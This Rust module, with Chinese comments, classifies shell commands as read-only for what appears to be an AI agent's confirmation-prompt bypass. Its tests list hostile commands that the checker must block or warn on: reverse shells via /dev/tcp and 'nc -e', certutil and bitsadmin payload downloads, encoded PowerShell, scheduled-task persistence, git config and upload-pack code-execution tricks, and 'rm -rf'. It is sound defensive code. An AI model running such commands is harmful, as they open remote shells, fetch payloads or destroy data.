//! # readonly.rs — 只读命令判定逻辑
//!
//! 判断给定命令是否为不改变系统或文件状态的纯读取操作，这类操作可以免弹窗确认。
//!
//! ## Key Exports
//! - `is_readonly_command()`: 跨平台判断命令是否为只读
//! - `is_readonly_git_args()`: git 子命令的只读判定（RunCommand 中 `git ...` 段的唯一口径）
//! - `is_readonly_command_windows()`: Windows 只读判定
//! - `is_readonly_command_unix()`: Unix 只读判定
//!
//! ## Dependencies
//! - Internal: `super::guards`, `super::regexes`
//! - External: `regex`

use super::guards::*;
use super::regexes::*;
use regex::Regex;
use std::sync::OnceLock;

/// 剥离命令开头连续的 PowerShell 赋值前缀（`$var =` / `$a = $b =`）。
///
/// 为什么允许剥：`$t = Test-NetConnection ...` 这类"变量捕获"本身不产生副作用，
/// 命令是否只读取决于**赋值右侧**。以前"见赋值一律非只读"把探活场景全部拦下了。
///
/// 为什么只剥**开头**：只有整条命令以赋值开头时，右侧才是唯一被执行体；
/// 命令中部出现的 `$x =`（多语句、脚本块、参数内部）语义不明，保持原判非只读，方向保守。
fn assignment_prefix_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(?i)^\$\{?\w+\}?\s*=\s*").unwrap())
}

fn strip_assignment_prefixes(cmd: &str) -> String {
    let mut rest = cmd.trim_start().to_string();
    // 上限 8 层防止病态长串；正常写法 `$a = $b = cmd` 两层足够
    for _ in 0..8 {
        let stripped = assignment_prefix_re().replace(&rest, "").to_string();
        if stripped == rest {
            break;
        }
        rest = stripped.trim_start().to_string();
    }
    rest
}

/// 把一条命令行切成"会被真正执行的各段"。
///
/// 分隔符覆盖两种 shell 里"执行下一条命令"的全部写法：
/// 管道 `|`、语句分隔 `;`、逻辑 `&&` / `||`、Windows cmd 的顺序执行 `&`、以及换行。
///
/// **为什么必须切**：只读判定如果只看第一个 `|` 之前的部分，
/// `Get-ChildItem; Remove-Item x` 会被判成"只读命令"——既有的"只读免弹窗"、
/// 以及只读保护的"只放行只读命令"，都会被一个分号直接绕过。
///
/// 切分是**保守**的：引号里的 `;` 也会被切开（可能把一条只读命令判成非只读），
/// 但方向安全——宁可拦错，不可放过。
fn split_command_segments(cmd: &str) -> Vec<&str> {
    cmd.split(|c| matches!(c, '|' | ';' | '&' | '\n' | '\r'))
        .map(str::trim)
        .filter(|segment| !segment.is_empty())
        .collect()
}

/// git 子命令的只读判定（**唯一口径**）。
///
/// （RunGitCommand 专用工具已退役，git 读写统一走 RunCommand）
/// 消费方：RunCommand 中 shell 命令里的 `git ...` 段 ——
/// 本模块与执行层第二道门共用这一份，避免"放行、拦截"口径分裂。
///
/// 三道关：
/// 1. **全局域标志**（子命令之前）不得命中 [`regexes::DANGEROUS_GIT_GLOBAL_FLAGS`]——
///    `-c` 能借 config 执行代码、`--git-dir` 能换掉整个判定基准；
/// 2. 第一个非选项词必须落在 [`READONLY_GIT_ARGS`] 白名单里；
/// 3. 参数里不能出现能把内容写到任意路径或借传输钩子执行代码的选项
///    （`--output=<file>` / `--exec` / `--upload-pack` / `--receive-pack`）。
///
/// 注意这是**白名单**：不在名单里的（`add` / `commit` / `restore` / `stash` / `apply`
/// / `branch` / `tag` / `remote` / `config` …）一律算非只读。
pub fn is_readonly_git_args(args: &[&str]) -> bool {
    // 第一道关：全局域（子命令之前的 token）危险标志。
    // take_while 到第一个非选项词为止，因此不影响子命令自己的选项（如 `git diff -c`）。
    // 短标志 `-C` 小写归一后并入 `-c`；粘连形态（-ccore.pager=sh / -C/path）同被前缀匹配覆盖。
    if args
        .iter()
        .take_while(|arg| arg.starts_with('-'))
        .any(|arg| {
            let lower = arg.to_lowercase();
            DANGEROUS_GIT_GLOBAL_FLAGS
                .iter()
                .any(|flag| lower.starts_with(flag))
        })
    {
        return false;
    }
    let Some(sub) = args
        .iter()
        .find(|arg| !arg.starts_with('-'))
        .map(|arg| arg.to_lowercase())
    else {
        return false;
    };
    if !READONLY_GIT_ARGS.iter().any(|allowed| *allowed == sub) {
        return false;
    }
    // 第三道关：`git log --output=x` / `git diff --output=x` 会写文件；
    // `--exec` 会执行命令；`--upload-pack` / `--receive-pack` 让 fetch/push/ls-remote
    // 借传输辅助程序执行任意代码（`git ls-remote --upload-pack=evil` 缝隙）。
    !args.iter().any(|arg| {
        let lower = arg.to_lowercase();
        lower.starts_with("--output")
            || lower.starts_with("--exec")
            || lower.starts_with("--upload-pack")
            || lower.starts_with("--receive-pack")
    })
}

/// PowerShell 别名归一（唯一口径）：`rm`/`del`/`erase`/`ri` → `remove-item`。
///
/// 消费 [`PS_ALIAS_TO_CANONICAL`]（单跳映射，照搬 Claude Code COMMON_ALIASES）。
/// 只影响 Windows 侧判定；bash 无固定别名语义，Unix 侧不做归一。
///
/// 只读判定的段循环在 `extract_command_name` 之后立刻调用本函数——
/// 执行层第二道门（execution.rs）与权限判定（policy_guard.rs）共用
/// `is_readonly_command`，归一因此对两道门同时生效，口径不会分裂。
pub fn normalize_ps_alias(name: &str) -> &str {
    let lower = name.to_lowercase();
    PS_ALIAS_TO_CANONICAL
        .iter()
        .find(|(alias, _)| *alias == lower)
        .map_or(name, |(_, canonical)| canonical)
}

/// - 管道中如果包含写操作 cmdlet 则不算只读
pub fn is_readonly_command_windows(cmd: &str) -> bool {
    // 安全约束：包含危险模式的不算只读
    if command_substitution_re().is_match(cmd) {
        return false;
    }
    // 赋值前缀剥离：`$t = Test-NetConnection ...` 按右侧判定（见 strip_assignment_prefixes）
    let cmd = &strip_assignment_prefixes(cmd);
    // 剥离后仍出现赋值模式 → 多语句/脚本块内赋值，语义不明，保守判非只读
    if Regex::new(r"(?i)\$\w+\s*=").unwrap().is_match(cmd) {
        return false;
    }
    // 输出重定向到文件（> 但不是 > $null 和 > NUL 和 > /dev/null）
    if cmd.contains('>') {
        // 提取 > 后面的内容，检查是否为安全的空重定向
        if let Some(gt_pos) = cmd.find('>') {
            let after = cmd[gt_pos + 1..].trim_start();
            let after_lower = after.to_lowercase();
            if !after_lower.starts_with("$null")
                && !after_lower.starts_with("nul")
                && !after_lower.starts_with("/dev/null")
                && !after_lower.starts_with("&")
            {
                return false;
            }
        }
    }
    // Splatting
    if Regex::new(r"@\w+").unwrap().is_match(cmd) {
        return false;
    }
    // 脚本块一票否决（CC hasScriptBlocks 的对应物）：`{ }` 里的代码是**独立执行体**，
    // 上面所有名单都只检查"命令名"，管不到脚本块内部——
    // `where { Remove-Item x }` / `dir | ? { Remove-Item $_ }` 会借免问通道放行。
    // 代价：Where-Object 过滤、计算属性等合法脚本块用法从此弹卡（宁可拦错，不可放过）。
    if cmd.contains('{') {
        return false;
    }

    // 按命令分隔符切开，检查每一段
    for segment in split_command_segments(cmd) {
        let name = extract_command_name(segment);
        if name.is_empty() {
            continue;
        }
        // 别名归一（改造②）：rm/del/erase → remove-item、sleep → start-sleep……
        // git/gh/docker 是外部 exe，不在 PowerShell 别名表内，归一对它们是恒等变换。
        let name = normalize_ps_alias(&name);

        // 检查是否为只读 PowerShell cmdlet
        if READONLY_CMDLETS.iter().any(|c| *c == name) {
            continue;
        }

        // 检查只读外部命令
        if name == "git" {
            // git 子命令检查：只读白名单判定（is_readonly_git_args 唯一口径）
            let git_args: Vec<&str> = segment.split_whitespace().skip(1).collect();
            if !is_readonly_git_args(&git_args) {
                return false;
            }
            continue;
        }

        if name == "gh" {
            let gh_sub = segment
                .split_whitespace()
                .nth(1)
                .unwrap_or("")
                .to_lowercase();
            // gh pr/issue 需要检查第三级子命令
            if gh_sub == "pr" || gh_sub == "issue" {
                let gh_action = segment
                    .split_whitespace()
                    .nth(2)
                    .unwrap_or("")
                    .to_lowercase();
                if !READONLY_GH_PR_ISSUE_ACTIONS.iter().any(|a| *a == gh_action) {
                    return false;
                }
            } else if !READONLY_GH_ARGS.iter().any(|a| *a == gh_sub) {
                return false;
            }
            continue;
        }

        if name == "docker" {
            let docker_sub = segment
                .split_whitespace()
                .nth(1)
                .unwrap_or("")
                .to_lowercase();
            if !READONLY_DOCKER_ARGS.iter().any(|a| *a == docker_sub) {
                return false;
            }
            continue;
        }

        // 检查 Windows 只读命令
        //
        // 必须是**整词**相等：原先这里是 `*c == name || name.starts_with(c)`，
        // 名单里的 `set` 于是把 `setx`（写用户环境变量）也判成了只读、免弹窗放行。
        if READONLY_WIN_COMMANDS.iter().any(|c| *c == name) {
            continue;
        }

        // 未知命令 → 不是只读
        return false;
    }

    true
}

// --- 破坏性命令警告 ---

/// Unix 只读命令检测
pub fn is_readonly_command_unix(cmd: &str) -> bool {
    // 安全约束
    if command_substitution_re().is_match(cmd) {
        return false;
    }
    // 赋值前缀剥离：与 Windows 侧同口径（见 strip_assignment_prefixes）
    let cmd = &strip_assignment_prefixes(cmd);
    if Regex::new(r"\$\w+\s*=").unwrap().is_match(cmd) {
        return false;
    }
    // 重定向到文件（> 但不是 > /dev/null 和 > &2）
    if cmd.contains('>') {
        if let Some(gt_pos) = cmd.find('>') {
            let after = cmd[gt_pos + 1..].trim_start();
            if !after.starts_with("/dev/null") && !after.starts_with("&") {
                return false;
            }
        }
    }
    if Regex::new(r"@\w+").unwrap().is_match(cmd) {
        return false;
    }
    // 脚本块一票否决：与 Windows 侧同口径（`{ }` 是独立执行体，bash 的
    // 分组 `{ …; }` / awk 脚本同理），名单只查命令名管不到块内代码。
    if cmd.contains('{') {
        return false;
    }

    for segment in split_command_segments(cmd) {
        let name = extract_command_name(segment);
        if name.is_empty() {
            continue;
        }

        // git 子命令检查
        if name == "git" {
            let git_args: Vec<&str> = segment.split_whitespace().skip(1).collect();
            if !is_readonly_git_args(&git_args) {
                return false;
            }
            continue;
        }

        // gh 子命令检查
        if name == "gh" {
            let gh_sub = segment
                .split_whitespace()
                .nth(1)
                .unwrap_or("")
                .to_lowercase();
            if gh_sub == "pr" || gh_sub == "issue" {
                let gh_action = segment
                    .split_whitespace()
                    .nth(2)
                    .unwrap_or("")
                    .to_lowercase();
                if !READONLY_GH_PR_ISSUE_ACTIONS.iter().any(|a| *a == gh_action) {
                    return false;
                }
            } else if !READONLY_GH_ARGS.iter().any(|a| *a == gh_sub) {
                return false;
            }
            continue;
        }

        if READONLY_UNIX_COMMANDS.iter().any(|c| *c == name) {
            continue;
        }

        return false;
    }
    true
}

// --- 主入口 ---

/// 主入口：对命令进行安全检查（中等严格级别，按平台自动分发）
///
/// 检查顺序：Block 类先检查（高危），Warn 类后检查（中危）。
/// 只读命令检测（按平台自动分发）
pub fn is_readonly_command(cmd: &str) -> bool {
    if cfg!(target_os = "windows") {
        is_readonly_command_windows(cmd)
    } else {
        is_readonly_command_unix(cmd)
    }
}

#[cfg(test)]
mod tests {
    use super::super::security::{check_command_safety, get_destructive_warning, SafetyResult};
    use super::*;

    // --- 基础检查 ---

    #[test]
    pub fn test_empty_command() {
        assert_eq!(
            check_command_safety(""),
            SafetyResult::Block("命令为空。".to_string())
        );
        assert_eq!(
            check_command_safety("   "),
            SafetyResult::Block("命令为空。".to_string())
        );
    }

    #[test]
    pub fn test_safe_commands() {
        assert_eq!(check_command_safety("dir"), SafetyResult::Safe);
        assert_eq!(check_command_safety("Get-ChildItem"), SafetyResult::Safe);
        assert_eq!(check_command_safety("echo hello"), SafetyResult::Safe);
        assert_eq!(check_command_safety("git status"), SafetyResult::Safe);
        assert_eq!(check_command_safety("cargo check"), SafetyResult::Safe);
        assert_eq!(check_command_safety("npm install"), SafetyResult::Safe);
    }

    #[test]
    pub fn test_reverse_shell_blocked() {
        assert!(matches!(
            check_command_safety("bash -i >& /dev/tcp/1.2.3.4/80"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("mkfifo /tmp/f"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("nc -e /bin/sh 1.2.3.4 80"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_base64_blocked() {
        assert!(matches!(
            check_command_safety("echo 'aGVsbG8=' | base64 -d"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("[Convert]::FromBase64String('aGVsbG8=')"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_iex_blocked() {
        assert!(matches!(
            check_command_safety("Invoke-Expression 'Get-Process'"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("iex 'Get-Process'"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_web_request_blocked() {
        assert!(matches!(
            check_command_safety("Invoke-WebRequest http://example.com"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("wget http://example.com"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("curl http://example.com"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_start_process_blocked() {
        assert!(matches!(
            check_command_safety("Start-Process notepad"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_net_webclient_blocked() {
        assert!(matches!(
            check_command_safety("(New-Object Net.WebClient).DownloadString('http://x')"),
            SafetyResult::Block(_)
        ));
    }

    // --- 新增：PowerShell 深度安全检查 ---

    #[test]
    pub fn test_encoded_command_blocked() {
        assert!(matches!(
            check_command_safety("powershell -EncodedCommand SGVsbG8="),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("pwsh -enc SGVsbG8="),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_download_utilities_blocked() {
        assert!(matches!(
            check_command_safety("certutil -urlcache -split -f http://x/payload.exe"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("bitsadmin /transfer job http://x/payload.exe C:\\temp\\p.exe"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("Start-BitsTransfer -Source http://x/file -Destination C:\\temp"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_com_object_blocked() {
        assert!(matches!(
            check_command_safety("New-Object -ComObject WScript.Shell"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("New-Object -ComObject Shell.Application"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_scheduled_task_blocked() {
        assert!(matches!(check_command_safety("Register-ScheduledTask -TaskName 'Updater' -Action (New-ScheduledTaskAction -Execute 'cmd.exe')"), SafetyResult::Block(_)));
        assert!(matches!(
            check_command_safety("schtasks /create /tn 'Updater' /tr 'cmd.exe' /sc daily"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_runas_blocked() {
        assert!(matches!(
            check_command_safety("Start-Process powershell -Verb RunAs"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_wmi_invoke_blocked() {
        assert!(matches!(
            check_command_safety(
                "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe'"
            ),
            SafetyResult::Block(_)
        ));
        assert!(matches!(check_command_safety("Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd.exe'}"), SafetyResult::Block(_)));
    }

    #[test]
    pub fn test_unc_path_blocked() {
        assert!(matches!(
            check_command_safety("dir \\\\server\\share"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("copy \\\\192.168.1.1\\share\\file.txt C:\\"),
            SafetyResult::Block(_)
        ));
    }

    // --- 新增：Warn 类检查 ---

    #[test]
    pub fn test_long_running_warned() {
        assert!(matches!(
            check_command_safety("npm run dev"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("pnpm dev"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("vite"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("flask run"),
            SafetyResult::Warn(_)
        ));
    }

    #[test]
    pub fn test_sleep_warned() {
        assert!(matches!(
            check_command_safety("sleep 5"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("Start-Sleep 5"),
            SafetyResult::Warn(_)
        ));
    }

    #[test]
    pub fn test_node_modules_warned() {
        assert!(matches!(
            check_command_safety("dir node_modules"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("ls node_modules"),
            SafetyResult::Warn(_)
        ));
    }

    #[test]
    pub fn test_control_chars_blocked() {
        assert!(matches!(
            check_command_safety("echo\x00test"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("echo\x07test"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_dangerous_variables_blocked() {
        assert!(matches!(
            check_command_safety("echo $RANDOM"),
            SafetyResult::Block(_)
        ));
        assert!(matches!(
            check_command_safety("echo $PPID"),
            SafetyResult::Block(_)
        ));
    }

    #[test]
    pub fn test_module_loading_warned() {
        assert!(matches!(
            check_command_safety("Import-Module ActiveDirectory"),
            SafetyResult::Warn(_)
        ));
        assert!(matches!(
            check_command_safety("Install-Module -Name Az"),
            SafetyResult::Warn(_)
        ));
    }

    #[test]
    pub fn test_dotnet_method_warned() {
        assert!(matches!(
            check_command_safety("[System.IO.File]::ReadAllText('C:\\test.txt')"),
            SafetyResult::Warn(_)
        ));
    }

    #[test]
    pub fn test_alias_manipulation_warned() {
        assert!(matches!(
            check_command_safety("Set-Alias -Name ls -Value Get-ChildItem"),
            SafetyResult::Warn(_)
        ));
    }

    // --- 只读命令检测 ---

    #[test]
    pub fn test_readonly_cmdlets() {
        assert!(is_readonly_command("Get-ChildItem"));
        assert!(is_readonly_command("dir"));
        assert!(is_readonly_command("Get-Content file.txt"));
        assert!(is_readonly_command("type file.txt"));
        assert!(is_readonly_command("Select-String 'pattern' file.txt"));
        assert!(is_readonly_command("Get-Process"));
        assert!(is_readonly_command("Test-Path C:\\temp"));
        assert!(is_readonly_command("Get-Date"));
        assert!(is_readonly_command("whoami"));
        assert!(is_readonly_command("hostname"));
        assert!(is_readonly_command("ipconfig"));
        assert!(is_readonly_command("systeminfo"));
    }

    #[test]
    pub fn test_readonly_git() {
        assert!(is_readonly_command("git status"));
        assert!(is_readonly_command("git diff"));
        assert!(is_readonly_command("git log --oneline -10"));
        assert!(is_readonly_command("git show HEAD"));
        assert!(!is_readonly_command("git push"));
        assert!(!is_readonly_command("git commit -m 'test'"));
        assert!(!is_readonly_command("git reset --hard"));
    }

    #[test]
    pub fn test_readonly_gh() {
        assert!(is_readonly_command("gh pr list"));
        assert!(is_readonly_command("gh issue view 123"));
        assert!(!is_readonly_command("gh pr create"));
    }

    #[test]
    pub fn test_readonly_docker() {
        assert!(is_readonly_command("docker ps"));
        assert!(is_readonly_command("docker images"));
        assert!(is_readonly_command("docker logs container_id"));
        assert!(!is_readonly_command("docker run ubuntu"));
        assert!(!is_readonly_command("docker rm container_id"));
    }

    #[test]
    pub fn test_not_readonly_with_substitution() {
        assert!(!is_readonly_command("Get-Content $(Get-Item file.txt)"));
        // 赋值右侧是写操作 → 仍然非只读
        assert!(!is_readonly_command("$x = Stop-Process -Name foo"));
        assert!(!is_readonly_command("Get-Process > output.txt"));
    }

    #[test]
    pub fn test_assignment_capture_of_readonly_is_readonly() {
        // A2：变量捕获（$t = ...）本身无副作用，右侧只读 → 整条只读
        assert!(is_readonly_command(
            "$t = Test-NetConnection localhost -Port 3000"
        ));
        // 脚本块一票否决后，右侧带 `{ }` 过滤的捕获不再免问（`Where-Object {…}` 弹卡）
        assert!(!is_readonly_command(
            "$conns = Get-NetTCPConnection -LocalPort 3000 | Where-Object {$_.State -eq 'Listen'}"
        ));
        assert!(is_readonly_command("$x = $y = Get-Process"));
        assert!(is_readonly_command(
            "Test-NetConnection localhost -Port 3000"
        ));
        assert!(is_readonly_command("Start-Sleep -Seconds 2"));
        assert!(is_readonly_command("ping 127.0.0.1"));

        // 捕获 + 后续写操作 / 多语句 / 右侧写操作 → 仍拦
        assert!(!is_readonly_command("$x = Get-Process; Remove-Item y"));
        assert!(!is_readonly_command("Get-Process; $x = 1"));
        assert!(!is_readonly_command("$x = Remove-Item y"));
        // 命令中部出现赋值（非开头前缀）→ 保守判非只读
        assert!(!is_readonly_command(
            "Get-Process | ForEach-Object { $a = 1 }"
        ));
    }

    #[test]
    pub fn test_readonly_pipeline() {
        // 脚本块一票否决：`Where-Object {…}` 过滤从此弹卡（名单只查命令名，管不到块内代码）
        assert!(!is_readonly_command(
            "Get-Process | Where-Object {$_.CPU -gt 100}"
        ));
        assert!(is_readonly_command("dir | Sort-Object Name"));
        assert!(!is_readonly_command("Get-Process | Stop-Process"));
    }

    #[test]
    pub fn test_command_chaining_is_not_readonly() {
        // 分隔符以前只切了 `|`：`Get-ChildItem; Remove-Item x` 会被判成"只读命令"，
        // 于是既有的"只读免弹窗"和只读保护都能被一个分号绕过。
        assert!(!is_readonly_command("Get-ChildItem; Remove-Item x"));
        assert!(!is_readonly_command("dir && del foo.txt"));
        assert!(!is_readonly_command("dir || Remove-Item -Recurse ."));
        assert!(!is_readonly_command("Get-Process\ndel foo.txt"));
    }

    #[test]
    pub fn test_readonly_command_name_matches_whole_word_only() {
        // 名单里的 `set` 曾经靠前缀匹配把 `setx` 也带成只读（setx 会写用户环境变量）
        assert!(!is_readonly_command("setx PATH evil"));
        assert!(!is_readonly_command("set FOO=bar"));
        assert!(!is_readonly_command("label D: MyDisk"));
        assert!(!is_readonly_command("schtasks /create /tn x /tr y"));
    }

    #[test]
    pub fn test_readonly_git_args_is_a_whitelist() {
        // 这些以前全是"黑名单漏网"：`git restore .` / `stash` / `apply` 能直接丢掉未提交的改动
        let non_readonly: &[&[&str]] = &[
            &["restore", "."],
            &["stash"],
            &["apply", "x.patch"],
            &["add", "-A"],
            &["rm", "-r", "src"],
            &["branch", "-D", "main"],
            &["tag", "-d", "v1"],
            &["remote", "add", "origin", "url"],
            &["config", "user.name", "x"],
            &["clean", "-fd"],
            &["checkout", "."],
            &["push"],
            &["commit", "-m", "x"],
        ];
        for args in non_readonly {
            assert!(!is_readonly_git_args(args), "{:?} 不该被判只读", args);
        }

        assert!(is_readonly_git_args(&["status"]));
        assert!(is_readonly_git_args(&["log", "--oneline", "-10"]));
        assert!(is_readonly_git_args(&["diff", "--stat"]));
        // 能把内容写到任意路径的选项
        assert!(!is_readonly_git_args(&["log", "--output=foo.txt"]));
    }

    #[test]
    pub fn test_dangerous_git_global_flags() {
        // 第一道关：全局域危险标志（子命令之前）——借 config/传输辅助程序执行代码、
        // 换掉判定基准、或制造"值被误当子命令"的解析差分
        for args in [
            &["-c", "core.fsmonitor=x", "status"][..],
            &["-ccore.pager=sh", "status"][..], // 短标志粘连形态
            &["-C", "/tmp", "log"][..],         // -C（大写，小写归一后命中 -c）
            &["-C/tmp", "log"][..],             // -C 粘连形态
            &["--git-dir", "/tmp/x", "status"][..],
            &["--git-dir=/tmp/x", "status"][..], // 等号 attached 形态
            &["--work-tree=/tmp/x", "status"][..],
            &["--namespace", "x", "log"][..],
            &["--shallow-file=/tmp/x", "log"][..],
            &["--attr-source", "HEAD~10", "log", "status"][..], // 解析差分
            &["--exec-path=/tmp/x", "version"][..],
        ] {
            assert!(
                !is_readonly_git_args(args),
                "{:?} 含危险全局标志，不该被判只读",
                args
            );
        }
        // 第三道关扩充：传输辅助程序选项——借 fetch/ls-remote/push 执行任意代码
        assert!(!is_readonly_git_args(&["ls-remote", "--upload-pack=evil"]));
        assert!(!is_readonly_git_args(&[
            "ls-remote",
            "--upload-pack",
            "evil"
        ]));
        assert!(!is_readonly_git_args(&["log", "--receive-pack=evil"]));

        // 不误伤：全局域扫描只看子命令之前的 token，子命令自己的选项不受影响
        assert!(is_readonly_git_args(&["diff", "-c"])); // diff 的合并 diff 输出格式
        assert!(is_readonly_git_args(&["log", "-n", "5"])); // -n 是 log 的计数选项
        assert!(is_readonly_git_args(&["ls-remote"]));
        assert!(is_readonly_git_args(&["log", "--oneline", "--color"]));
    }

    // --- 改造②：PowerShell 别名归一 ---

    #[test]
    pub fn test_ps_alias_normalization() {
        // 删除类别名 → remove-item（口径统一，缝隙闭合）
        for alias in ["rm", "del", "erase", "ri", "rd", "rmdir"] {
            assert_eq!(normalize_ps_alias(alias), "remove-item");
        }
        assert_eq!(normalize_ps_alias("mkdir"), "new-item");
        assert_eq!(normalize_ps_alias("md"), "new-item");
        assert_eq!(normalize_ps_alias("sleep"), "start-sleep");
        assert_eq!(normalize_ps_alias("ls"), "get-childitem");
        assert_eq!(normalize_ps_alias("dir"), "get-childitem");
        assert_eq!(normalize_ps_alias("gci"), "get-childitem");
        assert_eq!(normalize_ps_alias("cd"), "set-location");
        assert_eq!(normalize_ps_alias("cls"), "clear-host");
        assert_eq!(normalize_ps_alias("where"), "where-object");
        // 非别名原样返回（extract_command_name 产出的就是小写）
        assert_eq!(normalize_ps_alias("git"), "git");
        assert_eq!(normalize_ps_alias("remove-item"), "remove-item");
        // 脚本块一票否决落地后，②曾砍掉的 4 条已收回（脚本块形态由否决兜底）
        assert_eq!(normalize_ps_alias("foreach"), "foreach-object");
        assert_eq!(normalize_ps_alias("%"), "foreach-object");
        assert_eq!(normalize_ps_alias("?"), "where-object");
        assert_eq!(normalize_ps_alias("select"), "select-object");
    }

    #[test]
    pub fn test_alias_readonly_behavior() {
        // sleep → start-sleep（免问名单里有）→ 免问（方案 §2.2 体验改进）
        assert!(is_readonly_command_windows("sleep 5"));
        // ls / cat 在 pwsh 中是 Get-ChildItem / Get-Content 别名 → 免问
        assert!(is_readonly_command_windows("ls"));
        assert!(is_readonly_command_windows("cat README.md"));
        // 删除类别名归一后不在免问名单 → 弹卡（与 Remove-Item 同待遇，缝隙闭合）
        assert!(!is_readonly_command_windows("erase x"));
        assert!(!is_readonly_command_windows("ri x"));
        assert!(!is_readonly_command_windows("rm x"));
        // 无回归：cls/cd/echo/dir/type 归一后仍免问
        assert!(is_readonly_command_windows("cls"));
        assert!(is_readonly_command_windows("cd .."));
        assert!(is_readonly_command_windows("echo hello"));
        assert!(is_readonly_command_windows("dir"));
        assert!(is_readonly_command_windows("type file.txt"));
        // 管道：归一不改变各段的独立判定
        assert!(is_readonly_command_windows("dir | format-table"));
        // 脚本块一票否决：foreach/%/where/select 的脚本块形态全部弹卡
        assert!(!is_readonly_command_windows(
            "dir | foreach { Remove-Item x }"
        ));
        assert!(!is_readonly_command_windows("dir | % { Remove-Item x }"));
        assert!(!is_readonly_command_windows(
            "dir | where { Remove-Item x }"
        ));
        assert!(!is_readonly_command_windows(
            "dir | select { Remove-Item $_ }"
        ));
        // 无脚本块时：foreach 归一为 foreach-object（不在免问名单）→ 弹卡
        assert!(!is_readonly_command_windows("foreach -MemberName Name"));
        // where 归一为 where-object（免问名单里有）→ 免问；`where {…}` 已被否决拦住
        assert!(is_readonly_command_windows("where Name"));
    }

    // --- 破坏性命令警告 ---

    #[test]
    pub fn test_destructive_remove() {
        assert!(get_destructive_warning("Remove-Item -Recurse -Force C:\\temp").is_some());
        assert!(get_destructive_warning("rm -rf /tmp/test").is_some());
        // ① 补缺：-Force 单独命中；别名（del/ri）与 rm -r（非 -rf）命中
        assert!(get_destructive_warning("Remove-Item -Force secret.txt").is_some());
        assert!(get_destructive_warning("del -Recurse build").is_some());
        assert!(get_destructive_warning("ri x -Force").is_some());
        assert!(get_destructive_warning("rm -r old_dir").is_some());
        // 防误报：单文件删除是正常操作；词边界挡住内含 "-r"/"rm" 的 token
        assert!(get_destructive_warning("Remove-Item x.txt").is_none());
        assert!(get_destructive_warning("rm foo.txt").is_none());
        assert!(get_destructive_warning("rm --preserve-root x").is_none());
        assert!(get_destructive_warning("confirm -r x").is_none());
    }

    #[test]
    pub fn test_destructive_git() {
        assert!(get_destructive_warning("git reset --hard HEAD~1").is_some());
        assert!(get_destructive_warning("git push --force origin main").is_some());
        assert!(get_destructive_warning("git clean -fd").is_some());
        // ① 补缺：push 短标志 -f、clean --force、stash clear
        assert!(get_destructive_warning("git push -f origin main").is_some());
        assert!(get_destructive_warning("git clean --force").is_some());
        assert!(get_destructive_warning("git stash clear").is_some());
        // 防误报：--force-with-lease 带 lease 保护刻意不警示；-n 是 dry-run；词边界挡子串
        assert!(get_destructive_warning("git push --force-with-lease origin main").is_none());
        assert!(get_destructive_warning("git clean -n").is_none());
        assert!(get_destructive_warning("legit push --force").is_none());
    }

    #[test]
    pub fn test_destructive_sql() {
        assert!(get_destructive_warning("DROP TABLE users").is_some());
        assert!(get_destructive_warning("TRUNCATE TABLE logs").is_some());
    }

    #[test]
    pub fn test_destructive_system() {
        assert!(get_destructive_warning("Stop-Computer").is_some()); // 停止计算机
        assert!(get_destructive_warning("Clear-RecycleBin -Force").is_some()); // 清空回收站
    }

    #[test]
    pub fn test_not_destructive() {
        assert!(get_destructive_warning("Get-ChildItem").is_none());
        assert!(get_destructive_warning("git status").is_none());
        assert!(get_destructive_warning("echo hello").is_none());
    }
}
